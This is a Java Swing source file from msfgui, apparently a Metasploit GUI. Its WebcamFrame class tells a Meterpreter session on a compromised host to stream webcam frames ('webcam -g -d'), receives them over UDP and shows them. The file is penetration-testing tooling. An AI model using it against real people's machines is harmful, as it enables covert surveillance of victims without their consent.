package msfgui;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;
import java.util.Map;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;
import javax.swing.SwingWorker;

/**
 *
 * @author scriptjunkie
 */
public class WebcamFrame extends MsfFrame {
	protected final Map session;
	protected final RpcConnection rpcConn;
	public static final int CAM_SOCK_PORT_NUM = 16235;
	private SwingWorker sw;
	public static final char POLL = 'r';
	public static final char STOP_POLLING = 's';
	private final StringBuffer imageCommand;//synchronized mutable object as command placeholder for polling thread

	/** Creates new form WebcamFrame */
	public WebcamFrame(final RpcConnection rpcConn, final Map session) {
		initComponents();
		this.rpcConn = rpcConn;
		this.session = session;
		imageCommand = new StringBuffer("r");
	}

	/** Shows webcam window for a session, creating one if necessary */
	static void showWebcam(RpcConnection rpcConn, Map session, Map sessionWindowMap) {
		Object webcamWindow = sessionWindowMap.get(session.get("id")+"webcam");
		if(webcamWindow == null){
			webcamWindow = new WebcamFrame(rpcConn,session);
			sessionWindowMap.put(session.get("id")+"webcam",webcamWindow);
		}
		((MsfFrame)webcamWindow).setVisible(true);
	}

	/** This method is called from within the constructor to
	 * initialize the form.
	 * WARNING: Do NOT modify this code. The content of this method is
	 * always regenerated by the Form Editor.
	 */
	@SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        startButton = new javax.swing.JButton();
        stopButton = new javax.swing.JButton();
        delayLabel = new javax.swing.JLabel();
        delayField = new javax.swing.JTextField();
        imageLabel = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        setName("Form"); // NOI18N
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                formWindowClosing(evt);
            }
        });

        org.jdesktop.application.ResourceMap resourceMap = org.jdesktop.application.Application.getInstance(msfgui.MsfguiApp.class).getContext().getResourceMap(WebcamFrame.class);
        startButton.setText(resourceMap.getString("startButton.text")); // NOI18N
        startButton.setName("startButton"); // NOI18N
        startButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                startButtonActionPerformed(evt);
            }
        });

        stopButton.setText(resourceMap.getString("stopButton.text")); // NOI18N
        stopButton.setName("stopButton"); // NOI18N
        stopButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                stopButtonActionPerformed(evt);
            }
        });

        delayLabel.setText(resourceMap.getString("delayLabel.text")); // NOI18N
        delayLabel.setName("delayLabel"); // NOI18N

        delayField.setText(resourceMap.getString("delayField.text")); // NOI18N
        delayField.setName("delayField"); // NOI18N

        imageLabel.setText(resourceMap.getString("imageLabel.text")); // NOI18N
        imageLabel.setName("imageLabel"); // NOI18N

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(imageLabel, javax.swing.GroupLayout.DEFAULT_SIZE, 380, Short.MAX_VALUE)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(delayLabel)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(delayField, javax.swing.GroupLayout.PREFERRED_SIZE, 93, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(startButton)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(stopButton)))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(delayLabel)
                    .addComponent(delayField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(startButton)
                    .addComponent(stopButton))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(imageLabel, javax.swing.GroupLayout.DEFAULT_SIZE, 249, Short.MAX_VALUE)
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void startButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_startButtonActionPerformed
	try { //Make socket
		imageCommand.setCharAt(0, POLL);
		final DatagramSocket camSock = new DatagramSocket(CAM_SOCK_PORT_NUM);
		final WebcamFrame me = this;
		rpcConn.execute("session.meterpreter_script", session.get("id"),
				"webcam -g -d "+Integer.parseInt(delayField.getText()));
		sw = new SwingWorker() {
			private DatagramPacket dp = new DatagramPacket(new byte[100000], 100000);
			protected Object doInBackground() throws Exception {
				while (true) {
					//Get each picture and send it to label to be displayed
					camSock.receive(dp);
					byte[] imageData = new byte[dp.getLength()];
					System.arraycopy(dp.getData(), 0, imageData, 0, imageData.length);
					this.publish(imageData);
					if (imageCommand.charAt(0) != POLL){
						//Stop it!
						rpcConn.execute("session.meterpreter_script", session.get("id"), "webcam -s");
						camSock.close();
						return null;
					}
				}
			}
			protected void process(java.util.List values) {
				for (Object o : values)
					imageLabel.setIcon(new ImageIcon((byte[]) o));
				me.pack();
			}
		};
		sw.execute();
	} catch(NumberFormatException nex){
		JOptionPane.showMessageDialog(this, "Please enter a valid delay interval between frames!");
	} catch(MsfException mex) {
		JOptionPane.showMessageDialog(this, mex);
	} catch (SocketException sox) {
		JOptionPane.showMessageDialog(this, sox);
	}
    }//GEN-LAST:event_startButtonActionPerformed

    private void stopButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_stopButtonActionPerformed
		imageCommand.setCharAt(0, STOP_POLLING);
    }//GEN-LAST:event_stopButtonActionPerformed

	private void formWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosing
		imageCommand.setCharAt(0, STOP_POLLING);
	}//GEN-LAST:event_formWindowClosing

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JTextField delayField;
    private javax.swing.JLabel delayLabel;
    private javax.swing.JLabel imageLabel;
    private javax.swing.JButton startButton;
    private javax.swing.JButton stopButton;
    // End of variables declaration//GEN-END:variables
}
